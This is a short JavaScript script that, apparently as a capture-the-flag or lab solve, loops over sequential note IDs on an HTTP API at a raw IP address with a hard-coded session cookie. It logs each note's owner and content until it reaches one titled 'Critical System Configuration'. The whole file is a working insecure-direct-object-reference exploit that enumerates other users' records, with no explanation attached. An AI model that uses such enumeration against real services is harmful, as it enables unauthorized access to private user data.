async function returnResponse() {
  for (let i = 0; i < 211; i++) {
    const response = await fetch(`http://64.226.112.84:31511/api/notes/${i}`, {
      headers: {
        Cookie: "connect.sid=s%3AsgAXlYGvnf4A8sWxZPmu6OKh2V6Uc_ma.1FgkD4vSB4s2CAw3D%2FKTn7pJSQkEqB1p72bhAuTZA50",
      },
    });

    const data = await response.json();

    console.log({
      id: data.id,
      title: data.title,
      user_id: data.user_id,
      content: data.content,
    });

    if (data.title === "Critical System Configuration") {
      break;
    }
  }
}

returnResponse();
